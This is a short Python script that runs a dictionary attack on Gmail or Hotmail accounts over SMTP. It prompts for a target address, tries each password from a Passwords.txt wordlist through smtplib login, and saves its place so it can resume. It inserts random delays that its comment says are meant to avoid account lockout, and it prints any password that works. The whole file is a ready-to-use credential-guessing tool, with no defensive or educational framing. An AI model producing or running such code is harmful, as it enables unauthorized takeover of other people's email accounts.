import smtplib
import time
import random

def get_smtp_server(provider_choice):
    if provider_choice == '1':
        return "smtp.gmail.com"
    elif provider_choice == '2':
        return "smtp.live.com"
    else:
        print("Invalid choice. Exiting.")
        return None

def load_last_index():
    try:
        with open("last_index.txt", "r") as index_file:
            content = index_file.read().strip()
            return int(content) if content else 0  # Return 0 if content is empty
    except FileNotFoundError:
        return 0  # Return 0 if the file does not exist
    except ValueError:
        return 0  # Return 0 if the file contains an invalid integer

def main():
    print("Select your email provider:")
    print("1. Gmail")
    print("2. Live/Hotmail")
    provider_choice = input("Enter choice (1 or 2): ")

    smtp_server = get_smtp_server(provider_choice)
    if smtp_server is None:
        return

    smtp_port = 587
    email = input("Enter the email address to test: ")

    try:
        with open("Passwords.txt", "r", encoding="utf-8") as password_file:
            passwords = password_file.read().splitlines()
    except FileNotFoundError:
        print("Error: Passwords.txt file not found.")
        return

    # Load the last index to resume from
    start_index = load_last_index()
    print(f"Resuming from index: {start_index}")

    for i, password in enumerate(passwords[start_index:], start=start_index):
        try:
            print(f"Trying password: {password}")
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(email, password)  # No need to encode here
            print(f"Password found: {password}")
            server.quit()
            break
        except smtplib.SMTPAuthenticationError:
            print("Incorrect password.")
            server.quit()
            time.sleep(random.uniform(2, 5))  # Random sleep to prevent account lockout
        except UnicodeEncodeError as e:
            print(f"Unicode error: {e} while trying password: {password}")
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    else:
        print("Password not found in Passwords.txt.")

if __name__ == "__main__":
    main()